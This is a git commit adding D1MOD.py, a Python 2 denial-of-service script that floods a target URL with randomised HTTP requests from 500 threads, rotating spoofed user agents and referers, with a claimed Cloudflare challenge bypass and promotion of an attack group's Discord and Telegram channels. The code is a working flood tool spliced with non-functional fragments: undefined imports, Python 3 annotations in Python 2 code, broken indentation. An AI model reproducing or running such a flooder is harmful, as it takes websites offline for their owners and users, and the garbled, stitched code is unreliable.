97f1b6a3f82b39ce927f7388ad7fecf5e041083b
mrxD1MOD <99124744+mrxD1MOD@users.noreply.github.com>
2022-02-12 12:22:07 +0300

    Create D1MOD.py

---
+++ D1MOD.py
@@ -0,0 +1,203 @@
+import urllib2
+import sys
+import threading
+import random
+import re
+
+#global params
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
+
+def inc_counter():
+	global request_counter
+	request_counter+=1
+
+def set_flag(val):
+	global flag
+	flag=val
+
+def set_safe():
+	global safe
+	safe=1
+	
+# generates a user agent array
+def useragent_list():
+	global headers_useragents
+	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
+	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
+	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	return(headers_useragents)
+
+# CLOUDFLARE BYPASSER BY D1MOD
+def cloudflare_bypass(self, r):
+        body = r.text
+        scheme = re.search(r'^([\w]*)', r.url).group(1)
+        domain = re.search(r'\/\/([^\/]*)', r.url).group(1)
+        submit_url = '{}://{}/cdn-cgi/l/chk_jschl'.format(scheme, domain)
+        jschl_vc = re.search(r'name="jschl_vc" value="(\w+)"', body).group(1)
+        pas = re.search(r'name="pass" value="(.+?)"', body).group(1)
+        jschl_answer = str(self.solve_challenge(body) + len(domain))
+        time.sleep(5)
+        return '{0}?jschl_vc={1}&pass={2}&jschl_answer={3}'.format(submit_url, jschl_vc, pas, jschl_answer)
+
+ONE_BROWSER_QUERYS_LIMIT = 1500
+
+ANTI_DDOS_SLEEP_SECS = 600
+
+# LAYER4 CODED BY D1MOD
+class Layer4(Thread):
+    _method: str
+    _target: Tuple[str, int]
+    _ref: Any
+    SENT_FLOOD: Any
+    _amp_payloads = cycle
+
+    def __init__(self, target: Tuple[str, int],
+                 ref: List[str] = None,
+                 method: str = "TCP",
+                 synevent: Event = None):
+        super().__init__(daemon=True)
+        self._amp_payload = None
+        self._amp_payloads = cycle([])
+        self._ref = ref
+        self._method = method
+        self._target = target
+        self._synevent = synevent
+        
+        
+# GET HTTP FLOOD
+class HttpFlood(Thread):
+    _proxies: cycle = None
+    _payload: str
+    _defaultpayload: Any
+    _req_type: str
+    _useragents: List[str]
+    _referers: List[str]
+    _target: URL
+    _method: str
+    _rpc: int
+    _synevent: Any
+    SENT_FLOOD: Any
+
+
+
+# generates a referer array
+def referer_list():
+	global headers_referers
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('http://www.usatoday.com/search/results?q=')
+	headers_referers.append('http://engadget.search.aol.com/search?q=')
+  headers_referers.append('https://cloudfare.com')
+  headers_referers.append('https://wordpress.org')
+	headers_referers.append('http://' + host + '/')
+	return(headers_referers)
+	
+#builds random ascii string
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
+
+def usage():
+	print '---------------------------------------------------'
+	print 'USAGE: python2 D1MOD.py <url>'
+	print 'MADE BY D1MOD https://discord.gg/d1mod'
+  print '1877 TEAM https://1877.team/'
+  print '1877 TEAM https://t.me/x1877x'
+	print '---------------------------------------------------'
+
+	
+#http request
+def httpcall(url):
+	useragent_list()
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner="&"
+	else:
+		param_joiner="?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', random.choice(headers_useragents))
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
+	try:
+			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			#print e.code
+			set_flag(1)
+			print 'Response Code 500'
+			code=500
+	except urllib2.URLError, e:
+			#print e.reason
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)		
+
+	
+#http caller thread 
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
+
+# monitors http threads and counts requests
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				print "%d ATTACKED BY D1MOD" % ()
+				previous=request_counter
+		if flag==2:
+			print "\n-- D1MOD Attack Finished --"
+
+#execute 
+if len(sys.argv) < 2:
+	usage()
+	sys.exit()
+else:
+	if sys.argv[1]=="help":
+		usage()
+		sys.exit()
+	else:
+		print "-- D1MOD Attack Started --"
+		if len(sys.argv)== 3:
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(500):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
